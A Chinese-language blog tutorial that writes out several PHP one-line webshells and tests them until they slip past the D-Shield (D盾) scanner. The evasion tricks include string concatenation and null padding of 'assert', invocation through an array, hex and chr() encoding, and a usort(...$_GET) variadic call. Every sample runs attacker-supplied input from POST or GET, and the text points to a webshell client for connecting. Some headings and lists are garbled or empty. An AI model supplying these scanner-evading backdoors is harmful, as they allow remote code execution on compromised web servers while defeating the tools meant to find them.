### 0x01 概述

  一般我们说的PHP一句话木马，其实就是利用里PHP里面的代码执行函数，通过代码获取参数，然后调用命令执行函数执行我们传入的参数，关于代码执行函数和命令执行函数可以参考我之前写过的文章：

> https://www.cnblogs.com/fox-yu/p/9134848.html

这里我把常见的9个代码执行函数所写的一句话都写出来，未做变形处理，我们先用D盾扫描一下：

![](../Images/d9239e1be17f853d0ca39ccc67277094.png)

可以看到9个一句话后门全都被直接被扫出来，那接下来我们就对这些一句话木马进行处理，尝试绕过D盾的检测。

### 0x02 简单测试

我们先以assert一句话进行测试，因为它的级别最高，比较典型。  
根据D盾的检测说明：assert后门，我们猜测是**检测关键函数名**assert，因此我们尝试使用**字符串拼接**：

*   
*   
*   
*   
*   

```
<?php$ass = 'ass';$ert = 'ert';$d = $ass.$ert; //assert@$d($_POST['cmd']);
```

将我们变形后的一句话保存为webshell.php，后面不再说明，重新使用D盾扫描：  

![](../Images/5c7abd3a5e9c4254b973662bf12ae8a0.png)

  
可以看到级别下降为4了，说明这个字符串拼接是可行的。  
那么继续扩散思维，简单的字符拼接就下降了一个级别，那么是不是可以**拼接一些特殊字符**，比如空字符？

*   
*   
*   
*   
*   
*   

```
<?php$a = 'ass';$b = 'ert';$c = null;$d = $c.$a.$b.$c; //assert@$d($_POST['cmd']);
```

![](../Images/98d4e31cb466a04c9a434f643005a0b4.png)

可以看到又下降了一个级别，说明这个思路也可行。继续。  
我们刚才只是对assert进行处理，但是D盾是不是也会**检测到POST传参**，先不进行传参试试：

*   
*   
*   
*   
*   
*   
*   

```
<?php$ass = 'ass';$ert = 'ert';$c = null;$d = $c.$ass.$ert.$c; //assert$kk = "print_r(1)";@$d($kk);
```

![](../Images/834defe7ca79b6456c2ad4265fe171b0.png)

现在只是级别2了，那么可以确定D盾也会检测传参方式。  
既然变形后的assert还是被检测到变量函数了，那么我们就不直接调用assert函数，比如使用数组调用：  

*   
*   
*   
*   
*   
*   
*   

```
<?php$ass = 'ass';$ert = 'ert';$c = null;$d = $c.$ass.$ert.$c; //assert$kk = "print_r(1)";$arr = [''=>$d($kk)];
```

![](../Images/1e8dec43e3d1f62086fb8781e1c1ba6c.png)

可以看到已经成功绕过了D盾的变量函数检测，将POST传参改回来：  

*   
*   
*   
*   
*   
*   
*   

```
<?php$ass = 'ass';$ert = 'ert';$c = null;$d = $c.$ass.$ert.$c; //assert$kk = $_POST['cmd'];$arr = [''=>$d($kk)];
```

![](../Images/dc8c6f1f8a5b026427f78fcac49fd3cf.png)

同样无法检测出来，测试执行phpinfo：  

![](../Images/48884f6a1d6d07fbe3fc753dd826fda4.png)

完美，简单的三种绕过思路：字符拼接+空字符+数组，就成功绕过了D盾。至于怎么用菜刀连接，可以看我博客之前写的文章，链接在文章开头。

我们整理一下思路：

*   字符拼接，其实就是不直接使用关键函数名，那么除了字符拼接，是不是还可以使用其他方法比如：**编码、替换、反转、异或等等**。
    
*   空字符，也就是垃圾字符，那么除了空字符还有什么可以利用的垃圾字符呢？参考SQL注入，比如**换行符、空字符、注释符等等**。
    
*   数组，也就是调用方式，那么除了数组，PHP中还可以怎么调用呢？比如**函数调用、类调用等等**。

#### 3.1 函数名处理

##### 1.进制编码

十六进制

*   
*   
*   
*   

```
<?php$a = "ass\x65\x72\x74"; //assert@$a($_POST['cmd']);?>
```

ASCII编码  
由于PHP不像XSS那样有多个解析器，因此编码需要借助PHP中的函数来实现。  

*   
*   
*   
*   

```
<?php$a = Chr(97).Chr(115).Chr(115).Chr(101).Chr(114).Chr(116); //assert@$a($_POST['cmd']);?>
```

#### 3.2 特殊字符

...

> PHP5.6及以后，增加了以...为标识的变长参数，我们可以将一个数字索引数组，做为参数列表传入函数。

*   
*   
*   

```
<?php usort(...$_GET); ?>
```
